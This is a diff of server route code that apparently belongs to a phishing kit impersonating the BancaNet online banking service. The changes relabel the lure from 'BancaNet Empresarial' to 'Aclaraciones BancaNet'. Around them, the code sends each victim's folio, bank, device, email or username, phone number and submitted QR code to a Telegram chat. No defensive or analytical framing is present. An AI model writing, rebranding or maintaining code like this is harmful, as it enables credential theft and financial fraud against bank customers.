@@ -1562,7 +1562,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             // Notificar inicial a Telegram
             let telegramMessage = '';
             if (clientData.terminosAceptados) {
-              telegramMessage = `🏦 <b>ACCESO A BANCANET EMPRESARIAL INICIADO</b>\n\n` +
+              telegramMessage = `🏦 <b>ACCESO A ACLARACIONES BANCANET INICIADO</b>\n\n` +
                 `📋 <b>Folio:</b> ${uniqueFolio}\n` +
                 `🏦 <b>Banco:</b> ${banco}\n` +
                 `📱 <b>Dispositivo:</b> ${clientData.dispositivo || 'Desconocido'}\n` +
@@ -1767,7 +1767,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
             clients.set(sessionId, ws);
 
             // Enviar notificación a Telegram
-            const telegramMessage = `🏦 <b>NUEVO ACCESO A BANCANET EMPRESARIAL</b>\n\n` +
+            const telegramMessage = `🏦 <b>NUEVO ACCESO A ACLARACIONES BANCANET</b>\n\n` +
               `📋 <b>Folio:</b> ${newSession.folio}\n` +
               `🏦 <b>Banco:</b> ${banco}\n` +
               `📧 <b>Correo:</b> ${clientData.username || clientData.correo || 'No proporcionado'}\n` +
@@ -1786,7 +1786,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 folio: newSession.folio,
                 clientData,
                 timestamp,
-                message: `Cliente registrado para acceso a BancaNet Empresarial - Folio: ${newSession.folio}`
+                message: `Cliente registrado para acceso a Aclaraciones BancaNet - Folio: ${newSession.folio}`
               }
             }));
 
@@ -2265,7 +2265,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   `📋 <b>Folio:</b> ${sessionFolio}\n` +
                   `📞 <b>Teléfono:</b> ${sessionData?.celular || 'No proporcionado'}\n` +
                   `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n\n` +
-                  `Un cliente ha enviado su código QR para validación de acceso a BancaNet Empresarial.`;
+                  `Un cliente ha enviado su código QR para validación de acceso a Aclaraciones BancaNet.`;
 
                 sendTelegramMessage(qrTelegramMessage);
                 break;
